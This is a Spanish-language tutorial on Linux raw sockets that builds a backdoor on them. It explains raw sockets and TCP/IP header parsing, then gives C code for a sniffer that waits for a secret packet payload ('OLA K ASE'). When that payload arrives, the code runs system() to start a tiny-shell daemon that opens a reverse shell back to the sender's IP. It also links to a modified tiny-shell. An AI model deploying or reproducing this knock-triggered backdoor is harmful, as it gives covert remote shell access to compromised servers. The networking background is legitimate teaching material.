# Raw sockets en Linux
Los sockets, como bien nos ha enseñado Secu, sirven para conectar máquinas mediante la red.  
A nivel de sistema, los sockets son identificadores asociados a estructuras de datos, que el kernel procesa para enviar y recibir, una vez el espacio  
de usuario cede el control a éste.  
Digamos que cuando llamamos a la función socket() para crear uno, ésta si es correcto nos devuelve un valor entero de 0 a 1024 (o los máximos  
permitidos por aplicación y sistema).  
Este identificador, está registrado en una estructura del kernel de forma que cada vez que realizamos una operación, al final las realizamos aplicándolas  
a un número que luego el kernel convierte en proceso asociado a esa "conexión".  
Pero un raw socket, como su nombre indica, es "crudo", sin "cocinar". Si no entiendes la metáfora, te explico que normalmente un socket se crea asociado  
a dos protocolos. Y uno transparente asociado a uno de ellos. Por ejemplo: socket(AF_INET, SOCK_STREAM, IPPROTO_IP); creará un socket Ethernet  
(transparente), IP y TCP (por órden de menor a mayor nivel). Esto significa que el kernel va a interpretar que nosotros vamos a hacer operaciones bajo  
esa capa. Pero y si nosotros queremos implementar nuestro propio protocolo Ethernet o IP? Usaremos un raw socket. Pero desde espacio de usuario, no  
será tan sencillo. Porque seguramente el kernel no reconozca el tipo de pacquete y lo descarte. Tanto de salida como de entrada. Aunque para ello, tenemos  
opciones de configuración del kernel que nos permitirán enviar tal cual la información desde la capa ethernet hasta el protocolo que queramos. Como si  
queremos reimplementar IP. Pero claro, solo nosotros sabemos la especificación. Nadie más nos entenderá...  
  
Otra faceta de los raw sockets, es que además de enviar información libre de capas, nos permite recibir libre de conexiones. Es decir, si nosotros  
no hemos establecido conexión con un servidor que otro programa sí, por haber creado un raw socket podemos escuchar el tráfico de otro programa. En realidad,  
como root podemos escuchar todo el tráfico de red. Todo lo que pasa por el cable ethernet, se puede leer... es así como se implementan los sniffers.  
Wireshark no es más que un montón de código que procesa la entrada de un raw socket. Pero éste usa una librería llamada libpcap (creo que es esa y no  
libnet aunque esta era para eso en su día) que nos permite usar raw sockets desde una API más sencilla y cómoda.  
  
Para el ejemplo que os voy a enseñar, implementaremos los raw sockets desde la capa más baja que podemos desde un programa en C y para Linux... se trata  
de un sniffer, que cuando escucha un paquete concreto (con unos datos concretos (contraseña)), ejecuta una reverse shell hacia el orígen de ese paquete,  
y el puerto por donde entró.  
Por ejemplo, si yo envío "HOLA K ASE" a un apache escuchando en el puerto 443 en un servidor, el sniffer detectará la contraseña "HOLA K ASE" y  
conectará a la IP que envió ese paquete, por el puerto 80 o 443 (según conectó) y le abrirá una shell si conecta. Para ello, implementaremos un  
sniffer en el servidor y usaremos la tiny-shell de Chrispher Devine, ejecutada con un system() con parámetros de reverse shell. Y en la parte cliente,  
pondremos un cliente TCP en sockets normales, que ejecutará el cliente de la shell que será un cliente en escucha en el puerto 443... para escuchar en ese  
puerto y cuando reciba la conexión, entre en modo redirección de datos. Creo que con netcat podemos. Pero lo dejo en el aire por si no, y ya cuando  
haga el desarrollo lo veréis tal cual sea.  

# Enlaces de interés
Aquí os dejo los enlaces para obtener las herramientas usadas en el ejemplo, y de utilidad:

- modified Tiny shell https://github.com/D1W0U/tsh  
- sniffer adaptado http://www.binarytides.com/packet-sniffer-code-c-linux/  
- un ejemplo de envio frames ethernet https://gist.github.com/austinmarton/1922600
- y su post https://austinmarton.wordpress.com/2011/09/14/sending-raw-ethernet-packets-from-a-specific-interface-in-c-on-linux/

# Conceptos básicos
Para crear un socket de tipo raw, debemos usar la macro SOCK_RAW. Pero podemos estar a un nivel diferente en función de con qué parámetros lo creamos. Por ejemplo para estar desde la capa ethernet, podemos usar socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW), pero para estar en la capa TCP/IP socket(AF_PACKET, SOCK_RAW, IPPROTO_TCP), para la capa UDP/IP socket(AF_PACKET, SOCK_RAW, IPPROTO_UDP).

Nosotros en el ejercicio estamos en TCP/IP.

Usamos las funciones recvfrom() y sendto(), NO send() y recv(), o read() y write(). Porque debemos pasarle una estructura sockaddr que le dice al kernel dónde tiene que enviar, o de dónde recibir. Ya que no la coge directamente del paquete.

Recibimos y enviamos frames, OJO, NO datos encapsulados. Si no datos en crudo (RAW).

Por eso que usamos esta forma de posicionarnos en los diferentes protocolos de transmisión:

```
char sendbuf[1500]; // deberíamos usar el MTU
struct ether_header *eh = (struct ether_header *) sendbuf;
struct iphdr *iph = (struct iphdr *) (sendbuf + sizeof(struct ether_header));
```

# Explicación del sniffer
Me voy a centrar en la rutina que analiza el tráfico TCP y decide si lanzar o no la reverse y hacia dónde.

```
// a esta función le llega un frame (buffer) y el tamaño del frame.
// y decide si lanzar el tiny-shell daemon en modo connect-back o no.
// para ello, detectamos un paquete con datos, cuyo únicos datos,
// sea la REQUEST_KEY (OLA K ASE).
void check_cb_request(unsigned char *buffer, size_t size) {
	// el socket nos captura desde el protocolo IP, por tanto buffer+0 tiene el primer byte del protocolo IP.
    struct iphdr *iph = (struct iphdr *)buffer;
	// el segundo protocolo después de IP, que hemos elegido, es TCP. Calculamos el tamaño del protocolo IP con iph->ihl * 4.
    struct tcphdr *tcph = (struct tcphdr *)(buffer + iph->ihl * 4);
	// y después del protocolo tcp, vienen los datos. Que están desde el inicio de TCP hasta tcph->doff * 4.
	// por tanto data apunta a los datos del paquete que nos llega al sniffer, por TCP/IP.
    char *data = (char *)(buffer + iph->ihl * 4 + tcph->doff * 4);
	// el tamaño de data, es el tamaño del frame, menos el tamaño de los protocolo. Porque nuestro frame está así: [IP][TCP][DATOS].
	// pero recordad que si capturásemos ethernet también, sería: [ETHERNET][IP][TCP][DATOS].
    size_t data_sz = size - tcph->doff * 4 - iph->ihl * 4;
    char *sip = NULL;
    struct in_addr saddr = { .s_addr = 0 };
    char rshell_cmd[1024];
    pid_t pid = 0;

	// esta es la clave maestra, el knock knock, para que el sniffer ejecute la shell reversa.
    #define REQUEST_KEY "OLA K ASE"
	// comprobamos que las flags de TCP sean PUSH | ACK. Porque los datos se envían en paquetes con estas flags.
	// Podríamos hacer un cliente que enviase en el parámetro window de tcp, un valor como 0x1337.
	// pero como usamos netcat, analizamos todos los paquetes de datos TCP (entrantes y salientes OJO).
    if (tcph->psh && tcph->ack /*&& tcp->window == 0x1337*/) {
        // tenemos datos
		// si los datos son exactamente la REQUEST_KEY...
        if (data_sz == strlen(REQUEST_KEY) && strncmp(data, REQUEST_KEY, data_sz) == 0) {
			// cogemos la IP que nos ha enviado la REQUEST_KEY,
            saddr.s_addr = iph->saddr;
            sip = inet_ntoa(saddr);
			// (esto es para que el printf() no imprima más hallá de la REQUEST_KEY).
            data[data_sz] = 0;
            printf("Got request on port %d from IP %s (%s).\n", ntohs(tcph->th_dport), sip, data);
			// y formateamos un comando con la IP para connect back y el puerto. El puerto es el puerto donde llegó el paquete TCP/IP con datos, más 1.
            snprintf(rshell_cmd, sizeof(rshell_cmd), "./tsh/tshd -c %s -p %d", sip, ntohs(tcph->th_dport) + 1);
            printf("Launching reverse shell... (%s)\n", rshell_cmd);
			// lanzamos la reverse, y debería conectarnos y abrirnos una shell.
            system(rshell_cmd);
        }
    }
}
```

# Despedida
Espero que os haya quedado claro el concepto de raw socket. Y el ejemplo.  

Un saludo.  

-D1W0U
